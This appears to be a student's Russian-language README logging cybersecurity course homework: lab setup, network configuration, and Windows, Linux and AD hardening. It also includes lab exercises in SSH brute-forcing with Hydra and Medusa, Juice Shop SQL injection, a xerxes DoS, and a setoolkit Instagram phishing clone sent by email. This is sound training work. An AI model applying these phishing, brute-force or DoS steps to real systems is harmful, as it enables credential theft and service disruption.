# **Cyb04**
Прохождение курса "Кибербезопасность"




<details><summary>Занятие №1 Введение</summary>

___
> Скачать и установить VirtialBox
___

В наличие у меня имеется старый и достаточно слабый ноутбук, который может поддерживать только Win 8.1 без ущерба для производительности. Имеется доступ к ВЦОДу со следующими характеристиками: 27 GHz CPU, 25 Gb Memory, 500 Gb Storage. Исходя из предпосылок было принято развернуть одну мощную хостовую машину на Win 10, скачать и установить на нее VirtualBox, на базе данной хостовой машины строить инфраструктуру для обучения. 

Характеристики ВМ:

![Характеристики_ВМ](/Lesson_1/%D0%94%D0%97%201.png)

</details>

<details><summary>Занятие №2 Virtualbox</summary>

___
> Создать 3 виртуальные машины в VirtualBox и обеспечить сетевую связность
___

Были развернуты 3 виртуальные: Windows Server 2019 (10.10.0.4), Winsows 10 (10.10.0.5), Kali linux (10.10.0.6). В правила брантмауэра на ВМ Windows server 2019 и Windows 10 добавлено/включно правило, которое разрешает ICMP echo request (ping) данных машин.

![Сетевая связность](/Lesson_2/%D0%94%D0%97%202.png)

</details>


<details><summary>Занятие №3 Kali(Bruteforce)</summary>

___
> На машинах с системами Windows Server 2019 и 10 установить и включить SSH, включить RDP. С машины Kali Linux провести сканирование сети. 
___

Результаты сканирования сети, на них видны включенные SSH и RDP:

![Сканирование nmap](/Lesson_3/%D0%94%D0%97%203_1.png)

___
> Подобрать пароль от ssh ВМ Windows 10. 
___

Для удобства и быстроты подбора пароля на ВМ Windows 10 был установлен 2-ухзначный пароль. При помощи инструмента crunch были созданы словари из комбинации цифр и прописных латинских букв. Первый попытки подбора пароля при помощи инструмента Hydra выдавали ошибку (error: all children were disabled due connections error). 

![Ошибка](/Lesson_3/%D0%94%D0%97%203_2%20Hydra%20error.png)

Чтобы решить проблему были предриняты следующие действия:
1. Проверена возможность подключения по ssh вообще - успешно.
2. Были изменены настройки ssh при помощи kali-tweaks - без результатно.
3. Отключен брэнтмауэр ВМ Windows 10 - без результатно.
4. Пустить подбор пароля в один поток и с большим интервалом между запросами - без результатно.
5. Запустить подбор пароля при помощи инструмента medusa - процесс занял очень много времени.
6. Попробовал подобрать пароль к хостовой машине - успешно.

![Успех хост](/Lesson_3/%D0%94%D0%97%203_2%20hydra_host.png)

После перезагрузки системы ВМ Windows 10 (так как на нее скачались критические обновления и требовали перезагрузки) получилось подобрать пароль.

![Успех вм гидра](/Lesson_3/%D0%94%D0%97%203_2%20Hydra%20succes.png)

![Успех вм медуза](/Lesson_3/%D0%94%D0%97%203_2%20medusa_success.png)

___
> Изменить настройки фаервола и политики блокировки учетных записей при неправильном вводе пароля ВМ Windows 10. 
___

При изменении настроек блокировки аккаунта при неправильном вводе пароля hydra опять начала падать в ошибку. Medusa в свою очередь пыталась подобрать пароль, однако это заняло бы слишком много времени.

![Аккаунт](/Lesson_3/%D0%94%D0%97%203_2%20log.png)

При изменении параметров брантмауэра пропала возможность подключения по ssh вообще.

![Брантмауэр](/Lesson_3/%D0%94%D0%97%203_2%20ip.png)

![Ошибка SSh](/Lesson_3/%D0%94%D0%97%203_2%20ssh%20error.png)

</details>

<details><summary>Занятие №4 Основы сетей</summary>

___
> Проработать и изучить модель OSI
___
Была сделана памятка по модели  OSI в которую были добавлены примеры протоколов для каждого уровня, а так же возможные атаки относительно каждого уровня.

![Памятка](/Lesson_4/%D0%94%D0%97%204_1.png)

Текстовый вариант: [Памятка](/Lesson_4/%D0%94%D0%97-4_1.docx)
___
> Расписать из сети 192.168.0.0/25 все подсети с /26 по /30
___

![Подсети](/Lesson_4/%D0%94%D0%97%204_2.png)

Текстовый вариант: [Подсети](/Lesson_4/%D0%94%D0%97%204_2.xlsx)

___
> Конвертировать 3 ip адреса 192.168.100.1, 172.16.0.1, 10.10.10.10 в IPv6
___

![IPv4 to IPv6](/Lesson_4/%D0%94%D0%97%204_3.png)

Текстовый вариант: [IPv4 to IPv6](/Lesson_4/%D0%94%D0%97%204_3.xlsx)

</details>


<details><summary>Занятие №5 Cisco packet tracer</summary>

___
> Зайти в настройки домашнего роутера.	Изучить настройки, сделать скрины настройки проброса портов приложений (на примере если бы вы хотели открыть доступ к домашнему веб-серверу).
___

![Домашний роутер](/Lesson_5/%D0%94%D0%97%205%20home.png)
___
> Работа с Cisco Packet Tracer.	Собрать базовую схему комп-свитч-роутер-свитч-комп. Сегментировать сеть на 10 и 20 vlan, добиться видимости хостов. Настроить сеть, добиться echo ping запросов между хостами. Проследить на симуляции за пакетом ICMP.
___

Создана сеть состоящая из 2-ух коммутаторов, 4-х компьютеров, 1-го роутера. Изначально при подключении всех устройств в сеть, проблем с сетевой связностью не возникло. При разделении на два Vlan'а (10 и 20) компьютеры перестали видеть друг друга. Чтобы восстановить сетевую связность было необходимо: перевести интерфейсы, которые связывают коммутаторы и роутер в trunk mode, также создать на роутере субинтерфейсы с номерами Vlan'ов. 

![Схема](/Lesson_5/%D0%94%D0%97%205%20scheme.png)

![Коммутатор](/Lesson_5/%D0%94%D0%97%205%20com.png)

![Роутер](/Lesson_5/%D0%94%D0%97%205%20rout.png)

После данных действий сетевая связность восстановилась. Было поведена симуляция запроса ICMP echo request - успешно.

![ICMP echo](/Lesson_5/%D0%94%D0%97%205%20pack.png)

Втрорым решением данной проблемы могло быть использование L3 коммутатора с возможностями роутера

![L3](/Lesson_5/%D0%94%D0%97%205%20L3.png)
___
> На 1 из сторон заменить хост на сервер, настроить на сервере web страничку, настроить NAT на роутере, добиться доступа по NAT inside global адресу к web серверу 
___

В схему был добавлен сервер. На нем были настроены DNS и WEB-сервер. Для подключения к нему использовался настроенный статический NAT на роутере. Подключение было успешным из 2-ух Vlan'ов, как по внешнему IP (192.168.100.100 внутренний - 10.10.0.4) так и по доменному имени (test.com).

![Serv](/Lesson_5/%D0%94%D0%97%205%20serv.png)

![NAT](/Lesson_5/%D0%94%D0%97%205%20nat.png)

</details>

<details><summary>Занятие №6 Криптография</summary>

___
> Схема работы IPSec
___

Протоколы, которые используются при создании защищенного канала:

![Протоколы](/Lesson_6/%D0%94%D0%97%206%20ipsecprotocols.png)

Схема создания IPSec тоннеля:

![Схема тоннеля IPSec](/Lesson_6/%D0%94%D0%97%206%20%D1%81%D1%85%D0%B5%D0%BC%D0%B0%20%D1%82%D0%BE%D0%BD%D0%BD%D0%B5%D0%BB%D1%8F.png)

<details><summary>Этапы подключения IKE Phase 1</summary>

Step 1 : Negotiation

The peer that has traffic that should be protected will initiate the IKE phase 1 negotiation. The two peers will negotiate about the following items:

-  Hashing: we use a hashing algorithm to verify the integrity, we use MD5 or SHA for this.
- Authentication: each peer has to prove who he is. Two commonly used options are a pre-shared key or digital certificates.
- DH (Diffie Hellman) group: the DH group determines the strength of the key that is used in the key exchange process. The higher group numbers are more secure but take longer to compute.
- Lifetime: how long does the IKE phase 1 tunnel stand up? the shorter the lifetime, the more secure it is because rebuilding it means we will also use new keying material. Each vendor uses a different lifetime, a common default value is 86400 seconds (1 day).
- Encryption: what algorithm do we use for encryption? For example, DES, 3DES or AES.

Step 2: DH Key Exchange

Once the negotiation has succeeded, the two peers will know what policy to use. They will now use the DH group that they negotiated to exchange keying material. The end result will be that both peers will have a shared key.

Step 3: Authentication

The last step is that the two peers will authenticate each other using the authentication method that they agreed upon on in the negotiation. When the authentication is successful, we have completed IKE phase 1. The end result is a IKE phase 1 tunnel (aka ISAKMP tunnel) which is bidirectional. This means that both peers can send and receive on this tunnel.

</details>

Фаза 1 может проходить в двух режимах:

1. Main mode
2. Aggressive mode

Main mode - данный режим проходит за 6 обменов сообщениями (сообщение с настройками и подтверждение от другой стороны) и считается более безопасным так как меньше информации передается открытым кодом.

Aggressive mode - в данном режиме для поднятия канала необходимо 3 сообщения, но является менее безопасным, так как большее количество информации передается открытым кодом.

<details><summary>Этапы подключения IKE Phase 2</summary>

Just like in IKE phase 1, our peers will negotiate about a number of items:

- IPsec Protocol: do we use AH or ESP?
- Encapsulation Mode: transport or tunnel mode?
- Encryption: what encryption algorithm do we use? DES, 3DES or AES?
- Authentication: what authentication algorithm do we use? MD5 or SHA?
- Lifetime: how long is the IKE phase 2 tunnel valid? When the tunnel is about to expire, we will refresh the keying material.
- (Optional) DH exchange: used for PFS (Perfect Forward Secrecy).

</details>

Информация которая передается через канал IPSec может шифроваться двумя способами:

1. AH (Authentication Header) шифрование заголовка  
2. ESP (Encapsulating Security Payload) шифрование содержимого

Оба протокола поддерживают 2 режима:

- Transport mode (не скрывает оригинальный IP отправителя)
- Tunnel mode (скрывает оригинальный IP отправителя)

![AH](/Lesson_6/%D0%94%D0%97%206%20AH.png)

![ESP](/Lesson_6/%D0%94%D0%97%206%20ESP.png)

![AH+ESP](/Lesson_6/%D0%94%D0%97%206%20ESP.png)

___
> Подключение по SSH к Ubuntu при помощи сертификата
___

Для начала по условию задания необходимо установить ВМ с ОС Ubuntu и подключить к ней два интерфейса: один будет смотреть во внутренную сеть, второй - для подключения к сети интернет. 
 - Создаем еще одну NAT сеть для выхода в интернет с Ubuntu.
 - Создаем ВМ с двумя интерфейсами и подключаем их к сети NAT: один default в сети 10.10.0.0/24, второй ubuntu в сети 54.55.56.0/24.
 - После установки обновляем ОС 

 ```bash
 apt update
 apt upgrade
 ```

 - Проверяем установлен ли ssh сервис.

 ```bash
 systemctl status ssh
 ```
 - Настраиваем интерфейсы. Смотрим как называется каждый интерфес.
 
 ![U intf](/Lesson_6/%D0%94%D0%97%206%20U%20inerf.png)

  - В Ubuntu 22.04 настройки сети расположены не в /etc/network/interfaces, а необходимо создавать конфиг самому /etc/netplan/02-network.yaml (02 - приоритет конфига, чем выше число, тем более приоритетный конфиг).

 ![U netplan](/Lesson_6/%D0%94%D0%97%206%20U%20netplan.png)  
 
 - Проверяем настройки, применяем конфиг и проверяем интерфейсы. Если данный способ не поможет, то можно настроить через визуальный интерфейс настройки сети.
 
 ![U intf2](/Lesson_6/%D0%94%D0%97%206%20U%20inerf2.png)  

 - Теперь пробуем подключиться к ВМ Ubuntu c ВМ Kali по SSH. Если получилось создатьподключение, то далее переходим к созданию пары приватный и публичный ключи, а также установке установке публичного ключа на ВМ Ubuntu. 
 
 ```bash
 # Генерация публичного ключа. Ключ -t отвечает за алгоритм кодировки ключа 
  ssh-keygen 
 # После ввода команды будет 2 опции: указать место создания ключа и его имя, дополнительный пароль при подключении при помощи приватного ключа
 # Копируем ключ на удаленный хост. Если не указывать ключ через параметр -i то будет установлен ключ из стандартного местоположения
  ssh-copy-id -i /home/kali/.ssh/key.pub -p 2222 user@10.10.0.10
 # Вводим пароль пользователя, чтобы успешно установить публичный ключ на удаленную машину
 ```
 > Далее у меня возникли проблемы с подключением при помощи приватного ключа. Были приняты следующие меры: chmod 700 ~/.ssh, chmod 600 на кллючи, изменение крнфига на Ubuntu, дебаг выполнения кода подключения ssh при помощи ключа -v. Решением проблмы оказалось то, что было необходимо создать ключ в формате RSA: ssh-keygen -t RSA, так как по кмолчанию ключи создавались в формате ed25519
  
 - Чтобы подключаться при помощи приватного без ввода пароля необходимо изменить строки в конфиге Ubuntu: PubkeyAuthentication yes, PasswordAuthentication no. После каждого изменения конфига перезапускаем сервис.

 ```bash
 systemctl restart ssh
 ```
 ![U success](/Lesson_6/%D0%94%D0%97%206%20U%20pubkey.png)  

 - После этого был изменен конфиг sshd_config на ВМ Ubuntu для соответствия базовым рекомендациями безопасности.

![U conf1](/Lesson_6/%D0%94%D0%97%206%20U%20conf1.png) 

![U conf2](/Lesson_6/%D0%94%D0%97%206%20U%20conf2.png) 

![U conf3](/Lesson_6/%D0%94%D0%97%206%20U%20conf3.png) 

- Параметр Banner меняет приветствие при успешном SSH подключении. Необходимое нам приветствие записываем в файл /etc/banner.

___
> Настроить на Ubuntu возможность подключения к ней по RDP.
___

[Мануал для поделючения по RDP](https://ubuntu-news.ru/news/ubuntu-2204-podderzhivaet-podklyuchenie-po-protokolu-rdp-iz-korobki)

Так же необходимо выполнить команду и поменять пароль подключения в настройках:

```bash
systemctl --user --global --enable gnome-remote-desktop
```
 При подключении необходимо, чтобы пользователь вошел в систему.

![Успешное RDP-подключение](/Lesson_6/%D0%94%D0%97%206%20%20rdp.png)

___
> Установить и настроить WireGuard VPN на Ubuntu
___

[Мануал для поделючения по VPN](https://habr.com/ru/sandbox/189100/)

Для успешного подключения необходимо указать интерфейс и IP которое используется для выхода в сеть интернет.

![Успешное VPN-подключение](/Lesson_6/%D0%94%D0%97%206%20U%20vpn.png)


</details>

<details><summary>Занятие №7 Типы атак, OWASP top 10</summary>

___
> Изучить SQL запросы.
___

Пройдено.

![SQL](/Lesson_7/%D0%94%D0%97%207%20sql.png)

___
> Лабораторные работы по OWASP TOP 10.
___

Оговорюсь сразу: решал с помощью подсказок.

 1. Lab Broken Access Controll 1

![Lab1](/Lesson_7/%D0%94%D0%97%207%20lab1.png)
 
 2. Lab Broken Access Controll 2

![Lab2](/Lesson_7/%D0%94%D0%97%207%20lab2.png)

 3. Lab Injection 1

 ![Lab3](/Lesson_7/%D0%94%D0%97%207%20lab3.png)

 4. Lab SSRF 1

![Lab4](/Lesson_7/%D0%94%D0%97%207%20lab4.png)

___
> Тренировка поиска уязвимостей на примере OWASP Juice Shop
___

[Мануал по установке и выполнению базовых заданий](https://spy-soft.net/owasp-juice-shop/)

Устанавливаем по мануалу на ВМ Ubunru OWASP juice shop и Burp Suite. После установки node.js нужно зайти на [git OWASP juice shop](https://github.com/juice-shop/juice-shop/releases) скачать необходимый пакет, который будет соответствовать вашей ОС и версии node.js.

 ![Первый запуск](/Lesson_7/%D0%94%D0%97%207%20OJS%200.png)

Решаем задания по мануалу, желательно попробовать сначала решить самому.

 1. Задание один: найти таблицу лидеров

 Решаем при помощи мануала

 ![Задание 1](/Lesson_7/%D0%94%D0%97%207%20OJS%201.png)

 2. Получение доступа к панели администратора

  ![Задание 2](/Lesson_7/%D0%94%D0%97%207%20OJS%202.png)

 3. Создание учетной записи администратора при помощи изменения запроса

 ![Задание 3](/Lesson_7/%D0%94%D0%97%207%20OJS%203.png)

 4. Вход в учетную запись при помощи SQL-инъекции

 ![Задание 4_1](/Lesson_7/%D0%94%D0%97%207%20OJS%204_1.png)

 ![Задание 4_2](/Lesson_7/%D0%94%D0%97%207%20OJS%204_2.png)

 5. Подбор пароля к учетной записи администратора.

 Задание было решено при помощи Burp suite: в результате sql-инъекции были получены имя аккаунта доменного админа и хэш в формате MD5 его пароля. В результате поиска пароля по хэш-сумме в словаре, пароль оказался admin123

  ![Задание 5](/Lesson_7/%D0%94%D0%97%207%20OJS%205.png)

 6. Активация Delux фккаунта.

  Решением стало изменение в запросе поля способа оплаты на любое другое название, либо вообще удаление значения этого поля

  ![Задание 6](/Lesson_7/%D0%94%D0%97%207%20OJS%206.png) 

</details>

<details><summary>Занятие №8 Типы атак 2</summary>

___
> Провести DOS атаку на Juice Shop 
___

По условиям задания необходимо развернуть Juice shop как докер контейнер и провести на него DoS атаку при помощи инструмента xerxes.

Устанавливаем docker на ВМ Ubuntu. [Мануал по установке](https://docs.docker.com/engine/install/ubuntu/)

Разворачиваем контейнер Juice shop.

```bash
sudo service docker start
sudo usermod -aG docker $USER
sudo docker pull bkimminich/juice-shop
sudo docker run -d -p 80:3000 bkimminich/juice-shop
```

Заходим на ВМ с которой будем производить DoS атаку. В нашем случае это будет ВМ Kali. Пробуем открыть в браузере Juice Shop (в поисковой строке вводим IP-адрес ВМ Ubuntu). 

![Проверка Docker](/Lesson_8/%D0%94%D0%97%208%20before.png)

Далее переходим на [git xerxes](https://github.com/XCHADXFAQ77X/XERXES) качаем исолняемый файл и запускаем его.

```bash
sudo chmod 777 ~/xerxes
# ./xerxes IP PORT
sudo ./xerxes 10.10.0.10 80
```

Наблюдаем результат до DoS:

![До](/Lesson_8/%D0%94%D0%97%208%20befor%202.png)

Наблюдаем результат после DoS:

![После](/Lesson_8/%D0%94%D0%97%208%20after%201.png)

![После](/Lesson_8/%D0%94%D0%97%208%20after%202.png)

При этом можно использовать инструмент Wire Shark, чтобы посмотреть весь проходящий трафик. Однако делать это следует осторожно, чтобы машина не зависла от количества перехваченных пакетов.

В результате атаки работоспособность Juice shop не была нарушена.

</details>


<details><summary>Занятие №9 Социальная инженерия, фишинг</summary>

___
> Разослать фишинговое письмо с уникальной информацией, ведущее на копию крупного ресурса (соцсети, почты и т.д.) 
___

По условиям задания необходимо разослать фишинговое письмо пользователю, которое будет вести на evil twin (копию какого-либо популярного ресурса). Суть задания завладеть учетными данными пользователя. Для этого будем использовать инструмент setoolkit.

Для работы setoolkit необходимо сначала установить python. Устанавливаем python на ВМ Ubuntu. 

```bash
# обновляем репозиторий    
sudo apt update
# устанавливаем python
sudo apt install python3
# проверяем работоспособность
python3 --version
```

Устанавливаем setoolkit на ВМ Ubuntu. [Мануал по установке](https://github.com/trustedsec/social-engineer-toolkit?tab=readme-ov-file#linux)

Запускаем инструмент командой

```bash
# выполняем команду в директории setoolkit
# на всякий случай даем привелегии на исполнение файла инструмента
sudo chmod 777 path-to/setoolkit/setoolkit
sudo ./setoolkit
```

При входе в данный инструмент, у меня выбивало ошибку о том, что неправильно указан путь к базам matasploit. Устанавливаем metasploit. [Мануал по установке](https://www.alibabacloud.com/blog/what-is-metasploit-how-to-install-metasploit-on-ubuntu_599955).

При выполнении данного мануала возникла ошибка при выполнении команды:

```bash
sudo msfdb init
```

Для коректного выполнения данной команды необходимо убедиться, что сервис postgresql работает и выполнить команду:

```bash
snap install metasploit-framework
msfdb init
msfconsole
```

Данные команды должны пройти без ошибок и открыться база данных metasploit.

После выполнения этой операции необходимо перейти в конфиг setoolkit (/etc/setoolkit/set.config) и поменять путь к metasploit на тот куда скопировали репозиторий git.

![Конфиг setoolkit](/Lesson_9/%D0%94%D0%97%209%20conf.png)

После чего ошибки должны пропасть, а все инструменты станут доступны.

Теперь необходимо создать копию сайта при помощи которого мы будем воровать учетные данные пользователя. В моем случае я выбрал социальную сеть Instagram, так как при входе в нее сразу есть поля логина и пароля.

Запускаем setoolkit (sudo ./setoolkit) и переходим 1 > 2 > 3 > 2. Так как я буду проверять работу инструмента с ВМ Kali, то указываем IP-адрес внутренней сети (10.10.0.10).

!Важно. Необходимо чтобы 80 порт был при это свободен. Например мы поднимали в прошлом ДЗ контейнер с Juice shop, его будет необходимо закрыть. Программа вам об этом напомнит. 

![Запускает клон сайта](/Lesson_9/%D0%94%D0%97%209%20etwin.png)

После того как сайт заработал, открывам второе окно с терминалом и там запускаем еще один setoolkit для почтовой рассылки. Пред началом рассылки для проверки работоспособности был создан ящик на почте Rambler, так как там в настройках есть данные об SMTP сервере и не нужна дополнительная плата. Переходим 1 > 5 > 1 > 2 и заполняем форму отправки письма. 

Суть моего фишинговова письма была то, что гиперссылка была модифицирована. В тексте ссылки был указан Instagram, а сама ссылка вела на IP-адрес ВМ Ubuntu.

![Рассылка](/Lesson_9/%D0%94%D0%97%209%202.png)

![Доступ к сайту с Kali](/Lesson_9/%D0%94%D0%97%209%20SUC%201.png)

![Успех](/Lesson_9/%D0%94%D0%97%209%20SUC.png)

В ход выполнения ДЗ письмо не получилось отправить с подменным адресом отправителя, вероятно рамблер блокирует такую почту.

</details>


<details><summary>Занятие №10 - 11 Mittre At&ck, Re&ct, D3fence</summary>

___
> Составить матрицу Mittre At&ck для взлома инфраструктуры
___

Cхема инфраструктуры:

![Схема](Lesson_10-11/%D0%A1%D1%85%D0%B5%D0%BC%D0%B0.png)

Методология: при помощи MITRE ATT&CK Navigator составить матрицу потециальной угрозы для инфраструктуры, остовываясь на техниках и тактиках известных группировок.

Для анализа было выбрано 5 группировок: APT28, FIN13, Turla, PLATINUM, Darkhotel. Для каждой группировки был зделан свой слой, в котором была оценена угроза для нашей инфраструктуры тех техник, которые использует группировка. При оценке опасности техники учитывалось не только описание данной техники, но и конкретный способ реализации у этой группировки. 

В добавок к этому был добавлен еще один слой, на который было собрана суммарная информация по всем угрозам.

Экспортированный EXEL-файл со всеми таблицами:

[Mitre Att&ck](Lesson_10-11/summary%20(1).xlsx)

Минимальный набор техник реагирования для нашей системы:

[Mitre React](Lesson_10-11/RE%26CT_Enterprise_Matrix.xlsx)



</details>


<details><summary>Занятие №12 Законодательство и стандарты ИБ</summary>

___
> Ознакомиться с документацией и стандартами в области ИБ
___

 - [X] [Приказ ОАЦ №40 (Кибербез)](https://president.gov.by/fp/v1/508/document-thumb__45508__original/45508.1676445432.32ffad2142.pdf)

 - [X] [Приказ ОАЦ №130 (Кибербез)](https://www.oac.gov.by/public/content/files/files/law/prikaz-oac/2023%20-%20130.pdf)

 - [X] [Приказ ОАЦ №66 (Системы защиты информации)](https://www.oac.gov.by/public/content/files/files/law/prikaz-oac/2020%20-%2066.pdf)

 - [X] [ISO 27001 чеклист](https://www.smartsheet.com/sites/default/files/2020-06/IC-ISO-27001-Checklist-10838_PDF.pdf)

 - [ ] [ISO 27001 implementation guide](https://issuu.com/public-it/docs/certikit_iso27001_implementation_guide_v12?fr=sNDdiNjQyMzg4ODg)

 - [ ] [NIST 800-53 Security and Privacy Controls for Information Systems and Organizations](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)

___
> Создать план личного развития и роста в ИБ согласно Cybersecurity Roadmap 
___

[Cybersecurity Roadmap](https://roadmap.sh/cyber-security?s=66e2987012af4935a0b6cf17)

</details>


<details><summary>Занятие №13 Безопасность Windows OS</summary>

___
> Выполнить все пункты настройки windows согласно пунктов на страницах слайда 13 занятия №22-29
___

Настройка системы Windows согласно требованиям слайдов:

 1. Учетные записи и их настройка

![Слайд 22_1](/Lesson_13/%D0%94%D0%97%2013%2022_1.png)

![Слайд 22_2](/Lesson_13/%D0%94%D0%97%2013%2022_2.png)

![Слайд 23_1](/Lesson_13/%D0%94%D0%97%2013%2023_1.png)

![Слайд 23_2](/Lesson_13/%D0%94%D0%97%2013%2023_2.png)

![Слайд 23_3](/Lesson_13/%D0%94%D0%97%2013%2023_3.png)

 2. Включение RDP для УЗ администратора

![Слайд 24_1](/Lesson_13/%D0%94%D0%97%2013%2024_1.png)

![Слайд 24_2](/Lesson_13/%D0%94%D0%97%2013%2024_2.png)

 3. Настройка блокировки рабочего стола

![Слайд 25_1](/Lesson_13/%D0%94%D0%97%2013%2025_1.png)

 4. Установка антивируса

 В ходе установки антивирусного решения столкнулся со следующими проблемами:

   - Большинство бесплатных решений нельзя скачать в нашем регионе без VPN
   - Бесплатные антивирусы не работают на системах Windows Server 

В данном пункте ничего сложного не было, но не смотря на это он был не выполнен.

 5. Настройка установки обновлений

![Слайд 27_1](/Lesson_13/%D0%94%D0%97%2013%2027_2.png)

![Слайд 27_2](/Lesson_13/%D0%94%D0%97%2013%2027_3.png)

 6. Шифрование жесткого диска устройства (BitLocker)

Установка защиты диска ноутбука при помощи USB-устройства:

![Слайд 28_1](/Lesson_13/%D0%94%D0%97%2013%2028_1.png)

Установка защиты Windows Server при помощи файла, сохраненного на сетевой диск:

![Слайд 28_2](/Lesson_13/%D0%94%D0%97%2013%2028_2.png)

!Важно. По умолчанию на системе Windows server отсутствует утилита BitLocker. Ее можно установить при помощи команды в PowerShell

```PowerShell
Install-WindowsFeature BitLocker -IncludeAllSubFeature -IncludeManagementTools -Restart
```

 7. Включить брандмауэр и настроить логирование

![Слайд 29_1](/Lesson_13/%D0%94%D0%97%2013%2029_1.png)

___
> Добавить роль контроллера домена Active Directory
___

![AD](/Lesson_13/%D0%94%D0%97%2013%20ad.png)

___
> Настроить службу DNS
___

Служба DNS насроена. Прямые и обратные А-записи добавлены:

![DNS](/Lesson_13/%D0%94%D0%97%2013%20dns%201.png)

Команды dig и ping по доменному имени:

![Dig](/Lesson_13/%D0%94%D0%97%2013%20dns%20dig.png)

![Ping linux](/Lesson_13/%D0%94%D0%97%2013%20dns%20ping.png)

!Важно. На Debian-подобных системах DNS-сервер прописывается в /etc/resolv.conf

```bash
sudo nano /etc/resolv.conf
```

Ping по доменному имени с ВМ Win10 до ввода в домен:

![Ping win](/Lesson_13/%D0%94%D0%97%2013%20dns%20ping%202.png)

Ping по доменному имени с ВМ Win10 после ввода в домен:

![Ping win](/Lesson_13/%D0%94%D0%97%2013%20dns%20ping%203.png)


</details>


<details><summary>Занятие №14 Безопасность Linux OS</summary>

___
> BIOS/UEFI + парольную политику (слайд 26-30)
___

Настройка системы Lunux согласно требованиям слайдов:

 1. Настройка устройства. BIOS и TPM

 Работа проводится на ВМ которая развернута на гипервизоре Virtualbox, поэтому нетвозможности провести настройку BIOS

 2. Установка новой ОС с форматированием дисков и настройкой шифрования 

![Слайд 27_1](/Lesson_14/%D0%94%D0%97%2014%2027_1.png)

 3. Настройка выполнения парольной политики

![Слайд 28_1](/Lesson_14/%D0%94%D0%97%2014%2028_1.png)

![Слайд 29_1](/Lesson_14/%D0%94%D0%97%2014%2029_1.png)

![Слайд 30_1](/Lesson_14/%D0%94%D0%97%2014%2030_1.png)

 4. Настройка SSH-сервера

 Выполнялось ранее

![Слайд 32_1](/Lesson_14/%D0%94%D0%97%2014%2032_1.png)

 5. Настроить iptables правила в виде файла скрипта *.sh

![iptables_1](/Lesson_14/%D0%94%D0%97%2014%20iptables_1.png)

![iptables_2](/Lesson_14/%D0%94%D0%97%2014%20iptables_2.png)

 ```bash

#!/bin/bash

iptables -A OUTPUT -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp --dport 80 -j ACCEPT
iptables -A INPUT -p udp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.0.0/24 --dport ssh -j ACCEPT
iptables -P INPUT DROP

echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o enp0s8 -j MASQUERADE
iptables -A FORWARD -t ent0s3 -j ACCEPT
 
 ```

 6. Очистить все правила iptables, установить UFW firewall

 ```bash 

 iptables -F

 ```

![Слайд ufw_1](/Lesson_14/%D0%94%D0%97%2014%20ufw_2.png)

![Слайд ufw_2](/Lesson_14/%D0%94%D0%97%2014%20ufw_3.png)

![Слайд ufw_3](/Lesson_14/%D0%94%D0%97%2014%20ufw_4.png)

 ```bash
 #!/bin/bash

 ufw enable

 ufw allo from any to any proto tcp port 80,443
 ufw allo from any to any proto tcp port 80,443
 ufw allo from 10.10.0.0/24 to any app OpenSSH

 ufw route allow in on enp0s3 out on enp0s8 to any from any

 ```


</details>


<details><summary>Занятие №15-16 Защита инфраструктуры предприятия</summary>

___
> Поднять контроллер домена DC1 в отдельной подсети и установить роль DHCP
___

 На ВМ Windows server 2019 были изменены настройки адаптера с подсети 10.10.0.0/24 на 192.168.0.0/24. Были исправлены DNS записи Windows server 2019 для корректной работы сети. Так же была установлена роль DHCP, добавлен пул номеров 192.168.0.99-192.168.0.124, добавлены исключения в выдаче IP-адресов 192.168.0.99 и 192.168.0.101. После этого ВМ Windows 10 введена в домен и установлены настройки адаптера на получение IP-адреса автоматически. DHCP сервер присвоил ВМ Windows 10 IP-адрес 192.168.0.100.

 ![DHCP server](/Lesson_15-16/serv%20dhcp.png)

 ![DHCP win10](/Lesson_15-16/win10%20_%20dhcp.png)

 ___
> Настроить AD GPO согласно лучших практик
___
 
 Необходимо создать OU предприяти, добавить 2 отдела и создать в этих отделах по 2 пользователя. Затем создать групповую политику на каждый из отделов который касается парольной политики. Затем зайти на ВМ Windows 10 и выполнить команду gpresult /r для вывода всех политик, 

 ![GPO_1](/Lesson_15-16/gpo1.png)

 ![GPO_2](/Lesson_15-16/gpo2.png)

 ![GPO_3](/Lesson_15-16/gpo3.png)

Так как данные политики относится к разделу конфигурации компьютера, они не будут применены к пользователям, а значит не будут отражены в списке активных политик. Для того, чтобы посмотреть политики, которые действуют на компьютер необходимо открыть командную строку и ввести команду:

```powershell

gpresult /r /scope:computer

```

 ![GPO_4](/Lesson_15-16/gpo4.png)


</details>


<details><summary>Занятие №17 Защита инфраструктуры приложений</summary>

___
> Исследуем Docker
___

 1. Скачать образ ubuntu:18.04 c hub.docker.io, проверить целостность и соответствие контрольной суммы образа SHA256

 ```bash

 sudo docker pull ubuntu:18.04

 sudo docker image ls

 sudo docker inspect ubuntu:18.04

 ```

 ![Inspect image](/Lesson_17/%D0%94%D0%97_17_1.png)

 2. С помощью команды docker image ls отобразить все docker образы на системе, добавить в группу docker вашего пользователя для запуска команд docker без sudo
 
 Добавляем в группу docker вашего пользователя для запуска команд docker без sudo

 ```bash

 # добавляем группу docker, если надо
 sudo addgroup docker

 # добавляем пользователя в группу docker
 sudo gpasswd -a $USER docker

 # чтобы применить изменения необходимо перезайти в систему либо выполнить команду
 sudo newgrp docker

 # проверяем
 docker run hello-world

 ```

 ![Docker whithout sudo](/Lesson_17/%D0%94%D0%97_17_2.png)

 3. Запустить данный образ в интерактивном режиме в оболочке sh docker run -it <image name> sh

 ![Docker run image](/Lesson_17/%D0%94%D0%97_17_3.png)

 4. Запустить контейнер под пользователем tms. Внутри контейнера выполнить команду whoami для определения пользователя под которым вы запустили контейнер

 Запуск контейнера под хостовым пользователем

 ```bash
 
 # -it -v /etc/passwd:/etc/passwd - указываем хост файл с паролями как войлюм 
 # -u 'id -u':'id -g' - указываем параметры текущего хостового пользователя
 # -v 'pwd':'pwd' - применяем как доступный вольюм домашнюю папку хост-юзера
 # -w 'pwd' - создаем домашнюю директорию на гостевой машине по пути домашней директории хост-юзера
 docker run -it -v /etc/passwd:/etc/passwd -u 'id -u':'id -g' -v 'pwd':'pwd' -w 'pwd' ubuntu:18.04 sh

 ```

 ![Tms user](/Lesson_17/%D0%94%D0%97_17_4.png)

 5. Прогнать образ через один из сканеров безопасности проанализировать результаты

